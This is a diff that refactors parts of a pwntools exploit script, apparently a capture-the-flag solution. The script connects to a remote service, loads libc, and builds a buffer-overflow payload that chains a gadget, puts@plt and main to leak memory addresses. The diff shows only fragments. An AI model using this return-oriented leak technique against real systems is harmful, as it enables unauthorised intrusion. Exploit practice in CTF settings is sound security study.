@@ -10,12 +10,10 @@ remote_port=1199
 
 if uselibc==2 and haslibc==0:
     libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
-else:
-    if uselibc==1 and haslibc==0:
-        libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
-    else:
-        if haslibc!=0:
-            libc=ELF('./libc.so.6')
+elif uselibc==1 and haslibc==0:
+    libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
+if haslibc!=0:
+    libc=ELF('./libc.so.6')
 
 p=remote(remote_addr,remote_port)
 if haslibc!=0:
@@ -43,7 +41,7 @@ def rv(a):
     return p.recv(a)
 
 def raddr(a,l=None):
-    if l==None:
+    if l is None:
         return u64(rv(a).ljust(8,'\x00'))
     else:
         return u64(rl().strip('\n').ljust(8,'\x00'))
@@ -81,8 +79,7 @@ def leak(address):
     payload='A'*84+p32(pop_r0)+p32(address)+p32(puts_plt)
     payload+=p32(main)*8
     go(payload)
-    data = p.recv(4)
-    return data
+    return p.recv(4)
 
 def hack():
     pop_r0=0x00011bbc
